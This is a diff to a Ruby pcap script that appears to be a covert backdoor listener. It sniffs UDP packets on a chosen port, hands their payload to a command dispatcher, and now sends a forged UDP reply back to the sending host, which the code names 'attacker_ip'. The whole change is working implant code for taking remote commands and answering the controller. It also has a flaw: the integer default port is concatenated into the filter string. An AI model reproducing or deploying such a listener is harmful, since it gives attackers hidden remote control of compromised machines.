@@ -4,6 +4,7 @@ require 'optparse'
 require 'rubygems'
 require 'pcaplet'
 require 'thread'
+require 'packetfu'
 require './dispatch.rb'
 include Pcap
 
@@ -28,7 +29,7 @@ optparse = OptionParser.new do |opts|
 	end
 	# Optionally sepcifiy the nameserver to query
 	opts.on('-p', '--port PORT', "Port to listen on. Default 8000.") do |f|
-		options[:nameserver] = f
+		options[:port] = f
 	end
 end
 
@@ -36,7 +37,6 @@ optparse.parse!
 
 # Listening device
 dev = options[:dev]? options[:dev] : Pcap.lookupdev
-p dev
 # Listening port
 port = options[:port]? options[:port] : 8000
 
@@ -74,13 +74,26 @@ end
 # ---------------------------------------------------------
 
 cap = Pcap::Capture.open_live(dev)
-cap.setfilter('udp src port 8000')
+cap.setfilter('udp src port ' + port)
 
 cap.loop do |pkt|
-	p "Command receievd from " + pkt.ip_src.to_s
+	attacker_ip = pkt.ip_src.to_s;
+	local_ip = pkt.ip_dst.to_s;
+
+	p "Command receievd from " + attacker_ip
 	p Dispatch.new pkt.udp_data.to_s
 
 	cap.close
+
+	udp_pkt = PacketFu::UDPPacket.new
+	udp_pkt.udp_src = rand(0xffff - 1024) + 1024
+	udp_pkt.udp_dst = port
+
+	udp_pkt.ip_saddr = local_ip
+	udp_pkt.ip_daddr = attacker_ip
+
+	udp_pkt.recalc
+	udp_pkt.to_w(dev)
 end
 
 # ---------------------------------------------------------
